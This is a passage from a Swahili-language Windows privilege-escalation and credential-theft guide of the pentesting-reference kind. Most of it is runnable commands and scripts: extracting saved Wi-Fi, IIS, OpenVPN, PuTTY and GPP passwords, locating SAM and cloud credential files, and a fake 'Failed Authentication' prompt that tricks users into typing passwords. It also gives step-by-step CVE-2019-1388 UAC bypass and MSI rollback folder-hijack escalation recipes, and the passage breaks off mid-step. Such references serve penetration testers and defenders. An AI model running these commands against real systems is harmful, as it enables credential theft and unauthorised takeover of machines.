PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Kidhibiti cha Credentials cha Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia moduli ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Mara nyingi watu hutumia programu ya Sticky Notes kwenye workstations za Windows **kuhifadhi passwords** na taarifa nyingine, bila kutambua kuwa ni database file. Faili hii inapatikana kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na kila mara inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kuwa ili kurecover passwords kutoka kwa AppCmd.exe, unahitaji kuwa Administrator na kuiendesha chini ya kiwango cha High Integrity.**\
**AppCmd.exe** inapatikana kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, kuna uwezekano kwamba baadhi ya **credentials** zimewekwa na zinaweza **kurecoveriwa**.

Code hii ilitolewa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa privileges za SYSTEM**, wengi wako hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia ikiwa kuna kitu chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukikuta ingizo lolote ndani ya njia hiyo, huenda likawa ni SSH key iliyohifadhiwa. Imehifadhiwa kwa usimbaji fiche, lakini inaweza kufumbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii yanapatikana hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha mfumo, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda ssh keys, kuziongeza kwa `ssh-add` na kuingia kupitia ssh kwenye mashine. Registry ya HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Nakala rudufu za SAM na SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vitambulisho vya Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Cached GPP Pasword

Hapo awali kulikuwa na feature iliyowezesha deployment ya custom local administrator accounts kwenye kundi la machines kupitia Group Policy Preferences (GPP). Hata hivyo, method hii ilikuwa na security flaws kubwa. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama XML files kwenye SYSVOL, ziliweza kufikiwa na domain user yeyote. Pili, passwords ndani ya GPP hizi, zilizokuwa zime-encryptiwa kwa AES256 kwa kutumia default key iliyokuwa imetangazwa hadharani, ziliweza ku-decryptiwa na authenticated user yeyote. Hili lilikuwa risk kubwa, kwa kuwa lingewezesha users kupata elevated privileges.

Ili kupunguza risk hii, function ilitengenezwa ya kuscan locally cached GPP files zenye field ya "cpassword" ambayo si tupu. Baada ya kupata file kama hilo, function hu-decrypt password na kurudisha custom PowerShell object. Object hii inajumuisha maelezo kuhusu GPP na location ya file, hivyo kusaidia kutambua na kurekebisha security vulnerability hii.

Tafuta kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa files hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata manenosiri:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Vitambulisho vya OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kumbukumbu
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza daima **kumwomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unafikiri anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** ni **hatari sana**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **passwords** katika **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta credentials ndani yake

Ili **kurecover passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazowezekana zenye credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Unapaswa kuangalia dbs ambako passwords kutoka **Chrome au Firefox** zimehifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers ili kuona kama baadhi ya **passwords zimehifadhiwa** humo.

Tools za kutoa passwords kutoka kwenye browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni technology iliyojengwa ndani ya Windows operating system inayoruhusu **intercommunication** kati ya software components za lugha tofauti. Kila COM component **hutambuliwa kupitia class ID (CLSID)** na kila component hutoa functionality kupitia interface moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface**, mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32**, ambayo ina **default value** inayoelekeza kwenye **DLL**, pamoja na value inayoitwa **ThreadingModel**, ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata child registry InProcServer32, ambayo ina default value inayoelekeza kwenye DLL pamoja na value...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **overwrite DLLs** zozote zitakazo-execute, unaweza **escalate privileges** ikiwa DLL hiyo ita-execute na user tofauti.

Ili kujifunza jinsi attackers hutumia COM Hijacking kama persistence mechanism, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta kwenye registry majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **itekeleze kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na nywila zilizotajwa katika ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine bora ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii katika maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Handles Zilizovuja

Fikiria kwamba **process inayoendesha kama SYSTEM inafungua process mpya** (`OpenProcess()`) **ikiwa na ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini lakini ikirithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges iliyoundwa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia vibaya handles zaidi zilizo wazi za processes na threads zilizorithiwa zikiwa na viwango tofauti vya permissions (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazojulikana kama **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia networks tofauti. Hii inafanana na usanifu wa client/server, wenye roles zinazofafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe hiyo ina uwezo wa **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges** inayowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata privileges za juu zaidi** kwa kuchukua identity ya process hiyo mara inapowasiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inaruhusu **ku-intercept mawasiliano ya named pipe kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Service ya Telephony (TapiSrv) katika server mode hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliye-authenticate wa mbali anaweza kutumia vibaya njia ya async event inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa bytes 4** kiholela kwenye file yoyote iliyopo na inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL yoyote kiholela kama service. Mtiririko kamili:

- `ClientAttach` ikiwa `pszDomainUser` imewekwa kuwa path iliyopo na inayoweza kuandikwa → service huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa async events.
- Kila event huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` hadi kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha iondoe usajili/izime ili kurudia uandishi wa kuaminika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha ita `GetUIDllName` ikiwa na path ya DLL yoyote kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Links za Markdown zinazoweza kubonyezwa na zinazotumwa kwa `ShellExecuteExW` zinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza files zinazodhibitiwa na mshambuliaji kama user wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazotekelezwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali ya awali, kisha kutoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwenye processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama vile "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na privileges.

Hii inafanya iwezekane ku-escalate privileges na kufanya bypass ya UAC kwa wakati mmoja kwa kutumia vulnerability hiyo hiyo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary iliyotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya systems zilizoathirika ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili ku-exploit vulnerability hii, ni muhimu kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Una faili na taarifa zote muhimu katika GitHub repository ifuatayo:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa Folder Zisizo za Kawaida hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili kimsingi linatumia vibaya kipengele cha Windows Installer cha rollback ili kubadilisha files halali na files hasidi wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka folder `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa kuondoa MSI packages nyingine, ambapo rollback files zitakuwa zimebadilishwa ili ziwe na malicious payload.

Mbinu hii kwa muhtasari ni ifuatayo:

1. **Stage 1 – Kujiandaa kwa Hijack (`C:\Config.Msi` ibaki tupu)**

- Hatua ya 1: Install MSI
- Unda `.msi` inayosakinisha file isiyo na madhara (kwa mfano, `dummy.txt`) katika folder linaloweza kuandikwa (`TARGETDIR`).
- Weka installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuiendesha.
- Weka **handle** ikiwa wazi kwa file baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
- Ondoa `.msi` hiyo hiyo.
- Mchakato wa uninstall huanza kuhamisha files hadi `C:\Config.Msi` na kuzibadilisha majina kuwa files za `.rbf` (rollback backups).
- **Poll open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua file linapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Hutuma signal wakati `.rbf` imeandikwa.
- Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
- Inapokuwa imetumwa signal, **fungua file la `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia file hilo kufutwa**.
- Kisha **tuma signal kurudi** ili uninstall ikamilike.
- Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta contents zote, `C:\Config.Msi` haiondolewi.

- Hatua ya 5: Futa `.rbf` Mwenyewe
- Wewe (mshambuliaji) unafuta file la `.rbf` mwenyewe.
- Sasa **`C:\Config.Msi` liko tupu**, tayari kutekwa.

> Katika hatua hii, **trigger SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha Rollback Scripts na Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` Likiwa na Weak ACLs
- Unda tena folder `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (kwa mfano, Everyone:F), na **weka handle ikiwa wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Install Nyingine
- Sakinisha `.msi` tena, ikiwa na:
- `TARGETDIR`: Eneo linaloweza kuandikwa.
- `ERROROUT`: Variable inayosababisha failure ya kulazimishwa.
- Install hii itatumika ku-trigger **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
